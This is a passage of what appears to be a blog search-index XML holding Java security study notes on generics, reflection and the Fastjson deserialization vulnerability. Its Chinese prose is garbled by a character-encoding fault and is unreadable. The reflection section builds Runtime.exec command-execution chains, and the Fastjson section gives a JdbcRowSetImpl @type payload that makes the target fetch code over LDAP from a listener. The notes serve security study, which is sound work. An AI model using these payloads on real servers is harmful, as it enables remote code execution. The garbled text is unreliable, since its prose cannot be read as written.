ä¸ºåœ¨å£°æ˜æ³›å‹ç±»æ—¶Tå·²ç»è¢«æŒ‡å®šäº†ã€‚</p><p>å¦‚æœè¯¥æ–¹æ³•ä½¿ç”¨äº†æ³›å‹ç±»æ²¡æœ‰å£°æ˜çš„æ³›å‹Eï¼Œç¼–è¯‘å™¨å°±ä¼šæŠ¥é”™</p><p><img src="/../images/image-20230925155644795.png" alt="image-20230925155644795"></p><p><strong>åªæœ‰å£°æ˜äº†<code>&lt;&gt;</code>çš„æ–¹æ³•æ‰æ˜¯æ³›å‹æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generic</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;E&gt; T <span class="title function_">getKey</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaåå°„</title>
      <link href="/2023/05/01/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/05/01/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h1><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><blockquote><p>åå°„æ˜¯Javaçš„ç‰¹å¾ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§é—´æ¥æ“ä½œç›®æ ‡å¯¹è±¡çš„æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯<strong>JVMåœ¨è¿è¡ŒçŠ¶æ€çš„æ—¶å€™æ‰åŠ¨æ€åŠ è½½ç±»</strong>ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»ä¸­çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ï¼›è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚é€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬ä¸ä»…å¯ä»¥è·å–åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•(Methods)ã€æˆå‘˜å˜é‡(Fields)ã€æ„é€ æ–¹æ³•(Constructors)ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaç±»å®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰ã€‚</p></blockquote><p>ç±»åŠ è½½æµç¨‹å¦‚ä¸‹</p><p><img src="/../images/EsePjI7n9CtyqbA.png" alt="image-20230502220543579"></p><p>JVMåœ¨ç¬¬ä¸€æ¬¡è¯»å–åˆ°ä¸€ç§<code>class</code>ç±»å‹æ—¶ï¼Œå°†å…¶åŠ è½½è¿›å†…å­˜åä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ª<code>Class</code>ç±»å‹çš„å®ä¾‹ï¼Œå¹¶åœ¨è¯¥å®ä¾‹ä¸­ä¿å­˜äº†è¯¥<code>class</code>çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»åã€åŒ…åã€çˆ¶ç±»ã€å®ç°çš„æ¥å£ã€æ‰€æœ‰æ–¹æ³•ã€å­—æ®µç­‰ï¼Œå› æ­¤ï¼Œå¦‚æœè·å–äº†æŸä¸ª<code>Class</code>å®ä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ª<code>Class</code>å®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„<code>class</code>çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><h2 id="ç›¸å…³ç±»"><a href="#ç›¸å…³ç±»" class="headerlink" title="ç›¸å…³ç±»"></a>ç›¸å…³ç±»</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.Class <span class="comment">//ç±»å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">java.lang.reflect.Constructor <span class="comment">//ç±»çš„æ„é€ å™¨å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">java.lang.reflect.Field <span class="comment">//ç±»çš„å±æ€§å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method <span class="comment">//ç±»çš„æ–¹æ³•å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">java.lang.reflect.Modifier <span class="comment">//ç±»çš„ä¿®é¥°ç¬¦å¯¹è±¡</span></span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p><code>Class</code>ç±»å‹å®é™…ä¸Šæ˜¯ä¸€ä¸ªåå«<code>Class</code>çš„<code>class</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Class</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Class</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºClassç±»çš„æ„é€ å™¨æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥åªæœ‰JVMèƒ½å¤Ÿåˆ›å»ºClasså¯¹è±¡ã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³ä½¿ç”¨å°±éœ€è¦ä»¥ä¸‹å‡ ç§æ–¹æ³•è·å¾—ï¼š</p><h3 id="è·å¾—Classç±»"><a href="#è·å¾—Classç±»" class="headerlink" title="è·å¾—Classç±»"></a>è·å¾—Classç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è°ƒç”¨Classç±»çš„é™æ€æ–¹æ³•forNameè·å–æŸä¸ªç±»çš„Classç±»å®ä¾‹</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">æ³¨ï¼šç±»åé»˜è®¤ä¸ºç±»å®Œæ•´ï¤·å¾„,å¦‚java.lang.Runtime,é€šå¸¸ä½¿ç”¨è¿™ä¸ªæ¥è·å¾—Classç±»å®ä¾‹</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨æŸä¸ªç±»å®ä¾‹çš„getClass()æ–¹æ³•</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).getClass();    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//è®¿é—®æŸä¸ªç±»å®ä¾‹çš„classå±æ€§ï¼Œè¿™ä¸ªå±æ€§å°±å­˜å‚¨ç€è¿™ä¸ªç±»å¯¹åº”çš„Classç±»çš„å®ä¾‹</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).class;</span><br></pre></td></tr></table></figure><h3 id="è·å¾—æ„é€ å‡½æ•°"><a href="#è·å¾—æ„é€ å‡½æ•°" class="headerlink" title="è·å¾—æ„é€ å‡½æ•°"></a>è·å¾—æ„é€ å‡½æ•°</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] getConstructors() ï¼šåªè¿”å›<span class="keyword">public</span>æ„é€ å‡½æ•°</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•°</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getConstructor(ç±»&lt;?&gt;... parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„<span class="keyword">public</span>æ„é€ å‡½æ•°</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getDeclaredConstructor(ç±»&lt;?&gt;... parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•°</span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹åŒ–ç±»"><a href="#å®ä¾‹åŒ–ç±»" class="headerlink" title="å®ä¾‹åŒ–ç±»"></a>å®ä¾‹åŒ–ç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">clz.newInstance();</span><br></pre></td></tr></table></figure><blockquote><p>å®é™…ä¸Šæ˜¯è°ƒç”¨äº†è¯¥ç±»çš„æ— å‚æ„é€ å‡½æ•°</p><p>æ‰€ä»¥å‰ææ¡ä»¶ï¼š</p><p>è¯¥ç±»æœ‰æ— å‚æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”æ˜¯å…¬æœ‰çš„</p></blockquote><h3 id="è·å¾—æˆå‘˜æ–¹æ³•"><a href="#è·å¾—æˆå‘˜æ–¹æ³•" class="headerlink" title="è·å¾—æˆå‘˜æ–¹æ³•"></a>è·å¾—æˆå‘˜æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method method=Class.getMethod(String name, ç±»&lt;?&gt;... parameterTypes) <span class="comment">//è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">Method method=Class.getDeclaredMethod(String name, ç±»&lt;?&gt;... parameterTypes) <span class="comment">//è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¿™ä¸ªæ–¹æ³•çš„å‚æ•°ç±»å‹</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Method method=Class.getMethods() <span class="comment">//è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">Method method=Class.getDeclaredMethods() <span class="comment">// è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•</span></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨æˆå‘˜æ–¹æ³•"><a href="#ä½¿ç”¨æˆå‘˜æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æˆå‘˜æ–¹æ³•"></a>ä½¿ç”¨æˆå‘˜æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">method.invoke(ç±»å®ä¾‹, [è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹]);</span><br></pre></td></tr></table></figure><blockquote><p><strong>å¦‚æœè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ˜¯æ™®é€šæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç±»å¯¹è±¡ï¼›</strong></p><p><strong>å¦‚æœè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç±»ï¼›</strong></p></blockquote><h3 id="è·å–æˆå‘˜å˜é‡"><a href="#è·å–æˆå‘˜å˜é‡" class="headerlink" title="è·å–æˆå‘˜å˜é‡"></a>è·å–æˆå‘˜å˜é‡</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] getFields() ï¼šè·å–æ‰€æœ‰ <span class="keyword">public</span> ä¿®é¥°çš„æˆå‘˜å˜é‡</span><br><span class="line"></span><br><span class="line">Field[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦</span><br><span class="line"></span><br><span class="line">Field <span class="title function_">getField</span><span class="params">(String name)</span> è·å–æŒ‡å®šåç§°çš„ <span class="keyword">public</span> ä¿®é¥°çš„æˆå‘˜å˜é‡</span><br><span class="line"></span><br><span class="line">Field <span class="title function_">getDeclaredField</span><span class="params">(String name)</span> è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡</span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><p>å¸¸ç”¨çš„RCE</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„<code>Runtime</code>è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ­£å¸¸åªèƒ½é€šè¿‡å…¬æœ‰çš„æ–¹æ³•<code>Runtime.getRuntime() </code>æ¥è·å–åˆ° Runtime å¯¹è±¡</p></blockquote><p>é€šè¿‡åå°„å®ç°ä¸Šè¿°ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é¦–å…ˆéœ€è¦è·å¾—Runtimeç±»çš„Classå®ä¾‹</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//è·å¾—Runtimeç±»çš„getRuntimeæ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getruntime</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨è¯¥æ–¹æ³•è·å¾—Runtimeå¯¹è±¡</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getruntime.invoke(clz);</span><br><span class="line"><span class="comment">//è·å¾—Runtimeç±»çš„execæ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="comment">//è°ƒç”¨execæ–¹æ³•æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">exec.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ•´åˆæˆä¸€å¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="å¼ºåˆ¶è®¿é—®ç§æœ‰ï¼Œä¿æŠ¤"><a href="#å¼ºåˆ¶è®¿é—®ç§æœ‰ï¼Œä¿æŠ¤" class="headerlink" title="å¼ºåˆ¶è®¿é—®ç§æœ‰ï¼Œä¿æŠ¤"></a>å¼ºåˆ¶è®¿é—®ç§æœ‰ï¼Œä¿æŠ¤</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤æ‰§è¡Œä»£ç å¯ä»¥è½¬ä¸º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è·å¾—æ„é€ å‡½æ•°</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">        <span class="comment">// è·å¾—è®¿é—®ç§æœ‰æ–¹æ³•å’Œå±æ€§çš„æƒé™</span></span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹finalå­—æ®µ"><a href="#ä¿®æ”¹finalå­—æ®µ" class="headerlink" title="ä¿®æ”¹finalå­—æ®µ"></a>ä¿®æ”¹<code>final</code>å­—æ®µ</h3><p><img src="/../images/image-20230503115304804.png" alt="image-20230503115304804"></p><ul><li><p>åªæœ‰finalä¿®é¥°ï¼Œå¹¶ä¸”ä¸ºé—´æ¥èµ‹å€¼ï¼Œå¯ä»¥ä¿®æ”¹</p></li><li><p>å¦‚æœæ˜¯final+staticä¿®é¥°ï¼Œå¹¶ä¸”ä¸ºé—´æ¥èµ‹å€¼ï¼Œéœ€è¦å…ˆå»æ‰finalä¿®é¥°ç¬¦æ‰èƒ½ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å¾—modifiers</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameModifyField</span> <span class="operator">=</span> nameField.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line"><span class="comment">// ä¿®æ”¹æƒé™</span></span><br><span class="line">nameModifyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// å»é™¤finalä¿®é¥°ç¬¦</span></span><br><span class="line">nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"><span class="comment">// ä¿®æ”¹Fieldå€¼</span></span><br><span class="line">nameField.set(m,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;Drunkbaby Too Silly&quot;</span>));</span><br><span class="line"><span class="comment">// é‡æ–°æ·»åŠ ä¸Šfinalä¿®é¥°ç¬¦</span></span><br><span class="line">nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjsonæ¼æ´</title>
      <link href="/2023/05/01/fastjson/"/>
      <url>/2023/05/01/fastjson/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJsonæ˜¯ä»€ä¹ˆ"><a href="#FastJsonæ˜¯ä»€ä¹ˆ" class="headerlink" title="FastJsonæ˜¯ä»€ä¹ˆ"></a>FastJsonæ˜¯ä»€ä¹ˆ</h1><blockquote><p>Fastjsonæ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€æ¬¾jsonè§£æå™¨ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒ<strong>å°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBean</strong>ã€‚</p></blockquote><h1 id="FastJsonååºåˆ—åŒ–æ¼æ´"><a href="#FastJsonååºåˆ—åŒ–æ¼æ´" class="headerlink" title="FastJsonååºåˆ—åŒ–æ¼æ´"></a>FastJsonååºåˆ—åŒ–æ¼æ´</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><blockquote><p>1.2.24ï¼šfastjsonåœ¨è§£æjsonçš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨<code>autoType</code>æ¥å®ä¾‹åŒ–<strong>æŸä¸€ä¸ªå…·ä½“çš„ç±»</strong>ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„<code>setter/getter</code>æ–¹æ³•æ¥è®¿é—®å±æ€§ã€‚é€šè¿‡æŸ¥æ‰¾ä»£ç ä¸­ç›¸å…³çš„æ–¹æ³•ï¼Œå³å¯æ„é€ å‡ºä¸€äº›æ¶æ„åˆ©ç”¨é“¾ã€‚ </p><p>1.2.47ï¼šfastjsonäº1.2.24ç‰ˆæœ¬åå¢åŠ äº†ååºåˆ—åŒ–ç™½åå•ï¼Œè€Œåœ¨1.2.48ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹æ®Šæ„é€ çš„jsonå­—ç¬¦ä¸²ç»•è¿‡ç™½åå•æ£€æµ‹ï¼ŒæˆåŠŸæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p></blockquote><h3 id="Userç±»"><a href="#Userç±»" class="headerlink" title="Userç±»"></a>Userç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ— å‚æ„é€ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æœ‰å‚æ„é€ &quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setId&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.toJSONString(class);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lihua&quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">System.out.println(json);</span><br></pre></td></tr></table></figure><blockquote><p>åºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<code>Getter</code>æ–¹æ³•</p></blockquote><p><img src="/../images/image-20230912154025083.png" alt="image-20230912154025083"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lihua&quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(json);</span><br></pre></td></tr></table></figure><blockquote><p>ä¼ å…¥<code>SerializerFeature.WriteClassName</code>å¯ä»¥ä½¿å¾—Fastjsonæ”¯æŒè‡ªçœï¼Œå¼€å¯è‡ªçœååºåˆ—åŒ–æˆJSONçš„æ•°æ®å°±ä¼šå¤šä¸€ä¸ª@typeï¼Œè¿™ä¸ªæ˜¯ä»£è¡¨å¯¹è±¡ç±»å‹çš„JSONæ–‡æœ¬ã€‚</p></blockquote><p><img src="/../images/image-20230912153839072.png" alt="image-20230912153839072"></p><p><code>@type</code> æŒ‡å®šç±»ï¼Œå…¶ä»–ä¸ºè¯¥ç±»<code>Getter</code>æ–¹æ³•è¿”å›çš„ç±»å±æ€§</p><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parse(json) </span><br><span class="line">JSON.parseObject(json,class) </span><br></pre></td></tr></table></figure><p>åªæœ‰åœ¨æŒ‡å®šæ˜¯å“ªä¸€ä¸ªç±»çš„å‰æä¸‹</p><blockquote><p>ä½¿ç”¨<code>JSON.parse</code>ååºåˆ—åŒ–ä¼šè°ƒç”¨æ­¤ç±»çš„setæ–¹æ³•</p><p>ä½¿ç”¨<code>JSON.parseObject</code>ååºåˆ—åŒ–ä¼šè°ƒç”¨æ­¤ç±»çš„getå’Œsetæ–¹æ³•</p></blockquote><p><img src="/../images/image-20230912155454575.png" alt="image-20230912155454575"></p><p>å¦‚ä½•æŒ‡å®šä¸€ä¸ªç±»</p><ul><li><p>jsonä¸­ä½¿ç”¨@typeæŒ‡å®š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230912155538136.png" alt="image-20230912155538136"></p></li><li><p><code>parseObject</code>ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(json2, User.class)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230912155631461.png" alt="image-20230912155631461"></p></li></ul><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h3 id="JdbcRowSetImplé“¾"><a href="#JdbcRowSetImplé“¾" class="headerlink" title="JdbcRowSetImplé“¾"></a>JdbcRowSetImplé“¾</h3><blockquote><p>æœ¬è´¨æ˜¯JNDIæ³¨å…¥ï¼Œjdkç‰ˆæœ¬éœ€è¦æ»¡è¶³ 8u161 &lt; jdk &lt; 8u191</p></blockquote><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/g0tvin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>setDataSourceName</code>æ–¹æ³•æŠŠä¼ 